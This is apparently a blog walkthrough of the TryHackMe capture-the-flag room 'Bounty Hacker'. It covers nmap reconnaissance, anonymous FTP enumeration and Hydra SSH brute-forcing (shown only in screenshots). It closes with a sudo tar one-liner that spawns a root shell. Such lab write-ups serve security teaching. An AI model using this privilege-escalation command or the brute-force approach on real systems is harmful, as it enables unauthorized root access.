---
title: TryHackMe Bounty Hacker
date: 2021-08-20T23:29:16+05:30
lastmod: 2021-08-20T23:29:16+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm

draft: false
description: TryHackMe Room Bounty Hacker solved by Animesh Roy. this is a walkthough. read more...

---

## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|Bounty Hacker|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/9ad38a2cc31d6ae0030c888aca7fe646.jpeg)|
| <b> Room [Subscription Required] </b>| [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)|

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

## Recon

### nmap

     sudo nmap -sC -sV -oN nmap/init 10.10.60.197                                                                  1 ⨯
     [sudo] password for anir0y: 
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 23:33 IST
     Nmap scan report for 10.10.60.197
     Host is up (0.17s latency).
     Not shown: 967 filtered ports, 30 closed ports
     PORT   STATE SERVICE VERSION
     21/tcp open  ftp     vsftpd 3.0.3
     | ftp-anon: Anonymous FTP login allowed (FTP code 230)
     | -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
     |_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
     | ftp-syst: 
     |   STAT: 
     | FTP server status:
     |      Connected to ::ffff:10.17.4.40
     |      Logged in as ftp
     |      TYPE: ASCII
     |      No session bandwidth limit
     |      Session timeout in seconds is 300
     |      Control connection is plain text
     |      Data connections will be plain text
     |      At session startup, client count was 4
     |      vsFTPd 3.0.3 - secure, fast, stable
     |_End of status
     22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
     |   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
     |_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
     80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
     |_http-server-header: Apache/2.4.18 (Ubuntu)
     |_http-title: Site doesn't have a title (text/html).
     Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 23.41 seconds

## Flags

|Flag|question|ref|
|---|---|---|
|1|Deploy the machine.|`N/A`|
|2|Find open ports on the macine|`N/A`|
|3|Who wrote the task list?|[ref](#33)|
|4|What service can you bruteforce with the text file found?|`SSH`|
|5|What is the users password? |[SSH-BruteForce](#35-ssh-bruteforce)|
|6|user.txt|[user](#usertxt)|
|7|root.txt|[root]()|

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

### 3.3 FTP Enum

* ftp
  
  ![img](https://i.imgur.com/nVgnO6E.png)

* download `txt` file and read the content:

  ![img](https://i.imgur.com/7oa40G3.png)

### 3.5 SSH bruteforce

* Hydra Bruteforce
  
  ![img](https://i.imgur.com/MD96enN.png)

### User.txt

* SSH into box with found creds.
* read the `user.txt` file in desktop:
  
  ![img](https://i.imgur.com/oBwRPRn.png)

### Root.txt

* reading `sudo -l`

     ```bash
     lin@bountyhacker:~$ sudo -l
     [sudo] password for lin: 
     Matching Defaults entries for lin on bountyhacker:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

     User lin may run the following commands on bountyhacker:
     (root) /bin/tar
     ```

* we can run tar app as a root. Let's go to [gtfobins](https://gtfobins.github.io/gtfobins/tar/#sudo) and get the sudo exploit for tar. If you can't find it, here type:-
  
     `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

* Priv-Esc
  
     ![img](https://i.imgur.com/VqPz7Vu.png)
  
![footer](https://i.imgur.com/rCDF5u6.png)

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
